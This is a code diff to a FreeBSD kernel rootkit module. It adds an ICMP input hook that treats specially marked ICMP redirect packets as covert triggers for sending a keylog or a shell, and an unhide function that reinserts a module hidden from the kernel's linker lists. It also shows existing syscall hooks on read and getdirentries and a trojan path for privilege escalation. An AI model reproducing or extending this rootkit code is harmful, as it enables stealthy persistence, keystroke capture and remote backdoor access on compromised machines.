@@ -70,7 +70,23 @@ struct module {
 static int last_kld = -1;
 static struct linker_file *save_lf;
 static struct module *save_mod;
-//============================
+
+//============TRIGGERING ICMP==============
+#include <sys/mbuf.h> 
+#include <sys/protosw.h>
+#include <netinet/in.h> 
+#include <netinet/in_systm.h> 
+#include <netinet/ip.h> 
+#include <netinet/ip_icmp.h> 
+#include <netinet/ip_var.h>
+
+#define KEYLOG "key"
+#define RSHELL "shell"
+
+extern struct protosw inetsw[]; 
+pr_input_t icmp_input_hook;
+
+//========================================
 
 #define ORIGINAL	"/sbin/hello"
 #define TROJAN		"/sbin/priv_esc"
@@ -326,9 +342,81 @@ static int hide_kld(void)
 }
 
 
+static int unhide_kld(void){
+    if (!save_lf)
+        return -1;
+    
+    mtx_lock(&Giant);
+    sx_xlock(&kld_sx);
+    
+    (&linker_files)->tqh_first->refs += 2;
+    
+    LINKER_GET_NEXT_FILE_ID(save_lf->id);
+    
+    TAILQ_INSERT_TAIL(&linker_files, save_lf, link);
+    
+    sx_xunlock(&kld_sx);
+    mtx_unlock(&Giant);
+
+    if (!save_mod)
+        return -1;
+    
+    MOD_XLOCK;
+    
+    save_mod->id = nextid++;
+    TAILQ_INSERT_TAIL(&modules, save_mod, link);
+    
+    MOD_XUNLOCK;
+    
+    save_lf = 0;
+    save_mod = 0;
+    
+    return 0;
+}
+
 
 //==============================================================================
 
+int icmp_input_hook(struct mbuf **m, int *off, int proto){
+	struct icmp *icp;
+	int hlen = *off;
+
+	/* Locate the ICMP message within m. */
+	(*m)->m_len -= hlen;
+	(*m)->m_data += hlen;
+
+	/* Extract the ICMP message. */
+	icp = mtod(*m, struct icmp *);
+
+	/* Restore m. */
+	(*m)->m_len += hlen;
+	(*m)->m_data -= hlen;
+
+	/* Is this the ICMP message we are looking for? */
+	if (icp->icmp_type == ICMP_REDIRECT &&
+	    icp->icmp_code == ICMP_REDIRECT_TOSHOST &&
+	    strncmp(icp->icmp_data, KEYLOG, 6) == 0) {
+		printf("send keylog.\n");
+		return(0);
+	}
+
+	else if (icp->icmp_type == ICMP_REDIRECT &&
+	  	 	icp->icmp_code == ICMP_REDIRECT_TOSHOST &&
+	    	strncmp(icp->icmp_data, RSHELL, 6) == 0) {
+			printf("send shell.\n");
+			return(0);
+	}
+	else
+		printf("pinged\n");
+		return (icmp_input(m, off, proto));
+
+	return (icmp_input(m, off, proto));
+}
+
+
+
+
+//==============================================================================
 
 struct control_arg{
 	char *option;	
@@ -344,6 +432,7 @@ static int control(struct thread *td, void *arg) {
 		sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
 
 		sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
+		inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
 		hide_kld();
 		activated = 1;
 	}
@@ -352,7 +441,8 @@ static int control(struct thread *td, void *arg) {
 		sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
 
 		sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
-
+		inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
+		unhide_kld();
 		activated = 0;
 	}
 	return 0;
